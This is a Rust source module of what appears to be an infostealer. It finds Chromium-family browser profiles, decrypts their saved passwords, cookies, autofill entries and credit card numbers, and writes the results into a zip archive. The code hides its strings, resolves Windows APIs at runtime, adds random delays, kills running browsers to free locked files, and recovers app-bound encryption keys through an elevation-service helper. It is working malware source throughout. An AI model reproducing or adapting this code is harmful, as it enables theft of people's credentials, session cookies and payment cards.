//! Tier 1 (Chromium): passwords, cookies, history, autofill, cards, downloads,
//! searches — parsed from in-memory SQLite and decrypted with the profile's
//! os_crypt master key (DPAPI + AES-256-GCM v10; app-bound v20 via the
//! elevation-service helper in crate::abe, lazily per browser). Writes per-profile dirs:
//! Browser_<Name>_<Profile>/{Passwords,Cookies,History,AutoFill,...}.json
//! plus Cookies.txt (Netscape format).

use std::ffi::c_void;
use std::panic::{catch_unwind, AssertUnwindSafe};
use std::path::{Path, PathBuf};

use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use base64::Engine;

use crate::fsutil;
use crate::info::Info;
use crate::resolve::resolve;
use crate::zipw::ZipBuilder;

/// Chrome timestamps are microseconds since 1601-01-01 UTC.
const CHROME_EPOCH_DELTA_US: i64 = 11_644_473_600_000_000;

#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

type CryptUnprotectDataFn = unsafe extern "system" fn(
    p_data_in: *const DataBlob,
    ppsz_data_descr: *mut *mut u16,
    p_optional_entropy: *const DataBlob,
    pv_reserved: *mut c_void,
    p_prompt_struct: *const c_void,
    dw_flags: u32,
    p_data_out: *mut DataBlob,
) -> i32;

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x10;

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    for (name, user_data) in browser_roots() {
        crate::jitter::sleep_jitter(20, 80);
        let _ = catch_unwind(AssertUnwindSafe(|| {
            process_browser(zip, info, &name, &user_data);
        }));
    }
}

/// Discover `<dir>\User Data` roots under %LOCALAPPDATA% and %APPDATA%.
/// Returns (browser display name, User Data path) pairs, deduped by path.
/// Opera has no `User Data` level: `%APPDATA%\Opera Software\<X>` is itself
/// the profile root.
pub(crate) fn browser_roots() -> Vec<(String, PathBuf)> {
    let mut out: Vec<(String, PathBuf)> = Vec::new();
    for var in ["LOCALAPPDATA", "APPDATA"] {
        let Ok(base) = std::env::var(var) else {
            continue;
        };
        find_user_data_dirs(Path::new(&base), 0, &mut out);
    }
    if let Ok(base) = std::env::var("APPDATA") {
        if let Ok(entries) = std::fs::read_dir(Path::new(&base).join(crate::obf!("Opera Software"))) {
            for entry in entries.flatten() {
                let p = entry.path();
                if !p.is_dir() {
                    continue;
                }
                let dir_name = entry.file_name().to_string_lossy().into_owned();
                let Some(name) = opera_display_name(&dir_name) else {
                    continue;
                };
                if !out.iter().any(|(_, existing)| existing == &p) {
                    out.push((name.to_string(), p));
                }
            }
        }
    }
    out
}

fn opera_display_name(dir_name: &str) -> Option<&'static str> {
    if dir_name == crate::obf!("Opera Stable") {
        Some("Opera")
    } else if dir_name == crate::obf!("Opera GX Stable") {
        Some("OperaGX")
    } else if dir_name.starts_with(&crate::obf!("Opera Neon")) {
        Some("OperaNeon")
    } else {
        None
    }
}

fn find_user_data_dirs(dir: &Path, depth: u32, out: &mut Vec<(String, PathBuf)>) {
    if depth > 2 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if !p.is_dir() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().into_owned();
        let ud = p.join(crate::obf!("User Data"));
        if ud.is_dir() {
            if !out.iter().any(|(_, existing)| existing == &ud) {
                out.push((name, ud));
            }
            continue;
        }
        find_user_data_dirs(&p, depth + 1, out);
    }
}

/// Enumerate profile directories inside a User Data root. Opera-family roots
/// are themselves the profile (no Default/ subdir) and map to "Default".
pub(crate) fn profiles(user_data: &Path) -> Vec<(String, PathBuf)> {
    if user_data.join(crate::obf!("Login Data")).is_file()
        || user_data.join(crate::obf!("History")).is_file()
    {
        return vec![("Default".to_string(), user_data.to_path_buf())];
    }
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(user_data) else {
        return out;
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if !p.is_dir() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().into_owned();
        if name == crate::obf!("Default")
            || name == crate::obf!("Guest Profile")
            || name.starts_with(&crate::obf!("Profile "))
        {
            out.push((name, p));
        }
    }
    out
}

/// Per-browser collection result, gathered fully in memory before anything
/// reaches the zip: the archive writer is first-wins on duplicate names, so
/// a partial first pass (v20 blobs dropped by a failed ABE recovery) must
/// never be written — the ABE retry re-gathers and replaces the whole set.
#[derive(Default)]
struct BrowserArtifacts {
    files: Vec<(String, Vec<u8>)>,
    collected: bool,
    passwords: usize,
    cookies: usize,
    autofill: usize,
    cards: usize,
    v20_seen: usize,
    v20_failed: usize,
    /// v20 blobs were seen but the app-bound key could not be recovered.
    abe_failed: bool,
    /// ABE recovery diagnostics (which path, failure reason, exe version).
    abe_report: Option<crate::abe::AbeReport>,
}

impl BrowserArtifacts {
    fn push_json(&mut self, path: String, rows: &[serde_json::Value]) {
        if let Some(bytes) = json_file_bytes(rows) {
            self.files.push((path, bytes));
            self.collected = true;
        }
    }

    fn push_raw(&mut self, path: String, bytes: Vec<u8>) {
        self.files.push((path, bytes));
        self.collected = true;
    }
}

fn process_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, user_data: &Path) {
    let mut art = gather_browser(name, user_data, None);
    // Zero artifacts but databases exist on disk: failures were lock-related,
    // not absence. Killing the browser is the last resort — once per run,
    // then re-gather this browser once (a fresh Decrypter also re-attempts
    // the ABE key recovery).
    if !art.collected
        && browser_dbs_exist(user_data)
        && crate::procs::terminate_browsers_once() > 0
    {
        crate::jitter::sleep_jitter(20, 80);
        art = gather_browser(name, user_data, None);
    }
    // v20 blobs exist but the first ABE key recovery failed: one explicit
    // retry after the kill pass above — a browser killed for lock reasons
    // no longer holds the elevation service, and one transient failure must
    // not zero every v20 row for the run.
    if art.abe_failed {
        crate::jitter::sleep_jitter(20, 80);
        let (key, rep) = crate::abe::decrypt_app_bound_key_diag(user_data, name);
        // The retry attempt's diagnostics supersede the first pass's.
        art.abe_report = Some(rep);
        if let Some(key) = key {
            let retry = gather_browser(name, user_data, Some(key));
            if retry.v20_failed < art.v20_failed {
                // Keep the retry's artifacts/counts but the recovery report.
                let rep = art.abe_report.take();
                art = retry;
                art.abe_report = rep;
            }
        }
    }
    flush_browser(zip, info, name, art);
}

fn gather_browser(name: &str, user_data: &Path, abe_key: Option<Vec<u8>>) -> BrowserArtifacts {
    let mut dec = Decrypter::new(user_data, name);
    if let Some(key) = abe_key {
        dec.abe = Some(key);
        dec.abe_tried = true;
    }
    let mut art = BrowserArtifacts::default();
    for (profile, pdir) in profiles(user_data) {
        crate::jitter::sleep_jitter(20, 80);
        let base = format!("Browser_{}_{}", name, profile);
        gather_passwords(&base, &pdir.join(crate::obf!("Login Data")), &mut dec, &mut art);
        gather_cookies(&base, &pdir, &mut dec, &mut art);
        gather_web_data(&base, &pdir.join(crate::obf!("Web Data")), &mut dec, &mut art);
    }
    art.v20_seen = dec.v20_seen;
    art.v20_failed = dec.v20_failed;
    art.abe_failed = dec.abe_tried && dec.abe.is_none();
    art.abe_report = dec.abe_report;
    art
}

fn flush_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, art: BrowserArtifacts) {
    for (path, bytes) in &art.files {
        zip.add_file(path, bytes);
    }
    info.passwords_count += art.passwords;
    info.cookies_count += art.cookies;
    info.autofill_count += art.autofill;
    info.credit_cards_count += art.cards;
    info.v20_seen += art.v20_seen;
    info.v20_failed += art.v20_failed;
    if art.collected {
        info.add_browser(name);
    }
    // Browser version (IElevator IID revs track browser versions) — from the
    // ABE report when recovery ran, else a direct exe version query.
    let version = art
        .abe_report
        .as_ref()
        .and_then(|r| r.version.clone())
        .or_else(|| crate::abe::browser_version(name));
    if let Some(v) = version {
        info.browser_versions.insert(name.to_string(), v);
    }
    if let Some(rep) = &art.abe_report {
        if let Some(f) = &rep.fail {
            info.abe_fail.insert(name.to_string(), f.clone());
        }
    }
    if art.v20_seen > 0 {
        let mut msg = format!(
            "v20 {} seen={} failed={}",
            name, art.v20_seen, art.v20_failed
        );
        match &art.abe_report {
            Some(rep) => {
                match &rep.fail {
                    Some(f) => msg.push_str(&format!(" abe=fail:{}", f)),
                    None => msg.push_str(&format!(
                        " abe={}",
                        if rep.path.is_empty() { "ok" } else { rep.path }
                    )),
                }
                if let Some(note) = &rep.inj_note {
                    msg.push_str(&format!(" (inj:{})", note));
                }
            }
            None => msg.push_str(" abe=n/a"),
        }
        if let Some(v) = info.browser_versions.get(name) {
            msg.push_str(&format!(" ver={}", v));
        }
        crate::progress(&msg);
    }
}

/// Any profile DB present under this browser root?
fn browser_dbs_exist(user_data: &Path) -> bool {
    profiles(user_data).iter().any(|(_, pdir)| {
        [
            crate::obf!("Login Data"),
            crate::obf!("History"),
            crate::obf!("Web Data"),
            crate::obf!("Cookies"),
        ]
        .iter()
        .any(|f| pdir.join(f).is_file())
            || pdir
                .join(crate::obf!("Network"))
                .join(crate::obf!("Cookies"))
                .is_file()
    })
}

// ---------------------------------------------------------------------------
// Master key + decryption
// ---------------------------------------------------------------------------

fn master_key(user_data: &Path) -> Option<Vec<u8>> {
    let raw = fsutil::read_file(&user_data.join(crate::obf!("Local State")))?;
    let json: serde_json::Value = serde_json::from_slice(&raw).ok()?;
    let b64 = json
        .get(crate::obf!("os_crypt"))?
        .get(crate::obf!("encrypted_key"))?
        .as_str()?;
    let blob = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
    let dpapi = crate::obf!("DPAPI");
    let blob = blob.strip_prefix(dpapi.as_bytes())?;
    dpapi_decrypt(blob)
}

fn dpapi_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let fp = resolve(&crate::obf!("crypt32.dll"), crate::api!("CryptUnprotectData"));
        if fp == 0 {
            return None;
        }
        let free_fp = resolve("kernel32.dll", crate::api!("LocalFree"));
        if free_fp == 0 {
            return None;
        }
        let func: CryptUnprotectDataFn = std::mem::transmute(fp);
        let local_free: unsafe extern "system" fn(*mut c_void) -> *mut c_void =
            std::mem::transmute(free_fp);

        let in_blob = DataBlob {
            cb_data: data.len() as u32,
            pb_data: data.as_ptr() as *mut u8,
        };
        let mut out_blob = DataBlob {
            cb_data: 0,
            pb_data: std::ptr::null_mut(),
        };
        let ok = func(
            &in_blob,
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_blob,
        );
        if ok == 0 || out_blob.pb_data.is_null() {
            return None;
        }
        let out =
            std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize).to_vec();
        local_free(out_blob.pb_data as *mut c_void);
        Some(out)
    }
}

/// Decrypt a Chrome-encrypted blob: v10 AES-256-GCM with the os_crypt key,
/// v20 AES-256-GCM with the app-bound key (lazily recovered, cached per
/// browser), otherwise legacy DPAPI. Cookie plaintext (v10 and v20) carries a
/// 32-byte SHA-256(host_key) prefix that is stripped when `host` is given.
struct Decrypter<'a> {
    user_data: &'a Path,
    name: &'a str,
    v10: Option<Vec<u8>>,
    abe: Option<Vec<u8>>,
    abe_tried: bool,
    /// Diagnostics from the ABE recovery attempt (set when one ran).
    abe_report: Option<crate::abe::AbeReport>,
    v20_seen: usize,
    v20_failed: usize,
}

/// Chromium's cookie plaintext header (SHA-256 of host_key) per the public PoC.
const COOKIE_PLAINTEXT_HEADER_SIZE: usize = 32;

impl<'a> Decrypter<'a> {
    fn new(user_data: &'a Path, name: &'a str) -> Self {
        Self {
            user_data,
            name,
            v10: master_key(user_data),
            abe: None,
            abe_tried: false,
            abe_report: None,
            v20_seen: 0,
            v20_failed: 0,
        }
    }

    /// Recover the app-bound key once per browser, only when a v20 blob is
    /// actually encountered. Forks the ABE module doesn't know return None.
    fn abe_key(&mut self) -> Option<&[u8]> {
        if !self.abe_tried {
            self.abe_tried = true;
            let (key, rep) = crate::abe::decrypt_app_bound_key_diag(self.user_data, self.name);
            self.abe = key;
            self.abe_report = Some(rep);
        }
        self.abe.as_deref()
    }

    fn decrypt(&mut self, blob: &[u8], is_cookie: bool, host: &str) -> Option<Vec<u8>> {
        if blob.starts_with(crate::obf!("v20").as_bytes()) {
            self.v20_seen += 1;
            let plain = match self.abe_key() {
                Some(key) => aes_gcm_decrypt(key, blob),
                None => None,
            };
            let mut plain = match plain {
                Some(p) => p,
                None => {
                    self.v20_failed += 1;
                    return None;
                }
            };
            // v20: strip unconditionally (matches long-standing behavior),
            // preferring the verified host-hash match.
            strip_cookie_prefix(&mut plain, is_cookie, host, true);
            return Some(plain);
        }
        if blob.starts_with(crate::obf!("v10").as_bytes()) {
            let mut plain = aes_gcm_decrypt(self.v10.as_deref()?, blob)?;
            // v10: strip only when the prefix verifies — older v10 cookies
            // carry no prefix and must not be truncated.
            strip_cookie_prefix(&mut plain, is_cookie, host, false);
            return Some(plain);
        }
        dpapi_decrypt(blob)
    }
}

/// Strip the 32-byte SHA-256(host_key) prefix Chromium prepends to cookie
/// plaintext. Verified against `host` when available; `unconditional`
/// (v20 path) additionally strips whenever the plaintext is long enough,
/// preserving the behavior that predates host-key plumbing.
fn strip_cookie_prefix(plain: &mut Vec<u8>, is_cookie: bool, host: &str, unconditional: bool) {
    if !is_cookie || plain.len() < COOKIE_PLAINTEXT_HEADER_SIZE {
        return;
    }
    if !host.is_empty()
        && plain.starts_with(&crate::sha256::sha256(host.as_bytes()))
    {
        plain.drain(..COOKIE_PLAINTEXT_HEADER_SIZE);
        return;
    }
    if unconditional {
        plain.drain(..COOKIE_PLAINTEXT_HEADER_SIZE);
    }
}

/// AES-256-GCM over a "vXX" blob: 3-byte prefix, 12-byte nonce, body+tag.
fn aes_gcm_decrypt(key: &[u8], blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 3 + 12 + 16 {
        return None;
    }
    let nonce = &blob[3..15];
    let ciphertext = &blob[15..];
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher
        .decrypt(aes_gcm::Nonce::from_slice(nonce), ciphertext)
        .ok()
}

// ---------------------------------------------------------------------------
// SQLite (WAL-aware; see sqlutil)
// ---------------------------------------------------------------------------

fn open_db_file(path: &Path) -> Option<crate::sqlutil::Db> {
    crate::sqlutil::open(path)
}

fn chrome_time_to_unix(us: i64) -> i64 {
    (us - CHROME_EPOCH_DELTA_US).max(0) / 1_000_000
}

/// Serialize rows as the competition-format JSON file body (UTF-8 BOM).
/// None for empty row sets — empty files never enter the archive.
fn json_file_bytes(rows: &[serde_json::Value]) -> Option<Vec<u8>> {
    if rows.is_empty() {
        return None;
    }
    let body = serde_json::to_vec_pretty(rows).ok()?;
    // Competition example zips carry a UTF-8 BOM on every JSON file.
    let mut bytes = Vec::with_capacity(body.len() + 3);
    bytes.extend_from_slice(b"\xef\xbb\xbf");
    bytes.extend_from_slice(&body);
    Some(bytes)
}

// ---------------------------------------------------------------------------
// Per-artifact collectors
// ---------------------------------------------------------------------------

fn gather_passwords(base: &str, path: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
    let Some(conn) = open_db_file(path) else {
        return;
    };
    let Ok(mut stmt) =
        conn.prepare(crate::obf!("SELECT origin_url, username_value, password_value FROM logins").as_str())
    else {
        return;
    };
    let rows = stmt
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                // username_value may be NULL; keep the row with an empty name.
                row.get::<_, Option<String>>(1)?.unwrap_or_default(),
                row.get::<_, Vec<u8>>(2)?,
            ))
        })
        .map(|it| it.flatten().collect::<Vec<_>>())
        .unwrap_or_default();

    let mut out = Vec::new();
    for (url, username, enc) in rows {
        let Some(plain) = dec.decrypt(&enc, false, "") else {
            continue;
        };
        let password = String::from_utf8_lossy(&plain).into_owned();
        if password.is_empty() {
            continue; // failed/garbage decrypt — never ship empty rows
        }
        out.push(serde_json::json!({
            "Hostname": url,
            "Username": username,
            "Password": password,
        }));
    }
    art.passwords += out.len();
    art.push_json(format!("{}/Passwords.json", base), &out);
}

fn gather_cookies(base: &str, pdir: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
    let conn = open_db_file(
        &pdir
            .join(crate::obf!("Network"))
            .join(crate::obf!("Cookies")),
    )
    .or_else(|| open_db_file(&pdir.join(crate::obf!("Cookies"))));
    let Some(conn) = conn else {
        return;
    };
    let Ok(mut stmt) = conn.prepare(
        crate::obf!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies").as_str(),
    ) else {
        return;
    };
    let rows = stmt
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?,
                row.get::<_, i64>(5)?,
                row.get::<_, i64>(6)?,
            ))
        })
        .map(|it| it.flatten().collect::<Vec<_>>())
        .unwrap_or_default();

    let mut out = Vec::new();
    let mut netscape = String::from("# Netscape HTTP Cookie File\n");
    for (host, name, enc, path, expires, secure, httponly) in rows {
        let Some(plain) = dec.decrypt(&enc, true, &host) else {
            continue;
        };
        let value = String::from_utf8_lossy(&plain).into_owned();
        let expiry = chrome_time_to_unix(expires);
        // EditThisCookie format, matching the competition example zips.
        out.push(serde_json::json!({
            "domain": host,
            "name": name,
            "value": value,
            "path": path,
            "secure": secure != 0,
            "session": expires == 0,
            "expirationDate": if expires == 0 { 0 } else { expiry },
            "httpOnly": httponly != 0,
            "hostOnly": !host.starts_with('.'),
            "storeId": "0",
        }));
        netscape.push_str(&format!(
            "{}\t{}\t{}\t{}\t{}\t{}\t{}\n",
            host,
            if host.starts_with('.') { "TRUE" } else { "FALSE" },
            path,
            if secure != 0 { "TRUE" } else { "FALSE" },
            expiry,
            name,
            value
        ));
    }
    art.cookies += out.len();
    if !out.is_empty() {
        art.push_raw(format!("{}/Cookies.txt", base), netscape.into_bytes());
    }
    art.push_json(format!("{}/Cookies.json", base), &out);
}

fn gather_web_data(base: &str, path: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
    let Some(conn) = open_db_file(path) else {
        return;
    };

    let autofill = conn
        .prepare(crate::obf!("SELECT name, value FROM autofill").as_str())
        .and_then(|mut stmt| {
            let rows = stmt
                .query_map([], |row| {
                    Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
                })?
                .flatten()
                .collect::<Vec<_>>();
            Ok(rows)
        })
        .unwrap_or_default();
    let af_json: Vec<serde_json::Value> = autofill
        .iter()
        .map(|(name, value)| serde_json::json!({ "Name": name, "Value": value }))
        .collect();
    art.autofill += af_json.len();
    art.push_json(format!("{}/AutoFill.json", base), &af_json);

    let cards = conn
        .prepare(
            crate::obf!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").as_str(),
        )
        .and_then(|mut stmt| {
            let rows = stmt
                .query_map([], |row| {
                    Ok((
                        row.get::<_, String>(0)?,
                        row.get::<_, i64>(1)?,
                        row.get::<_, i64>(2)?,
                        row.get::<_, Vec<u8>>(3)?,
                    ))
                })?
                .flatten()
                .collect::<Vec<_>>();
            Ok(rows)
        })
        .unwrap_or_default();
    let mut card_json = Vec::new();
    for (name, month, year, enc) in cards {
        let Some(plain) = dec.decrypt(&enc, false, "") else {
            continue;
        };
        card_json.push(serde_json::json!({
            "Name": name,
            "Number": String::from_utf8_lossy(&plain),
            "Expiry": format!("{:02}/{:04}", month, year),
        }));
    }
    art.cards += card_json.len();
    art.push_json(format!("{}/Cards.json", base), &card_json);
}
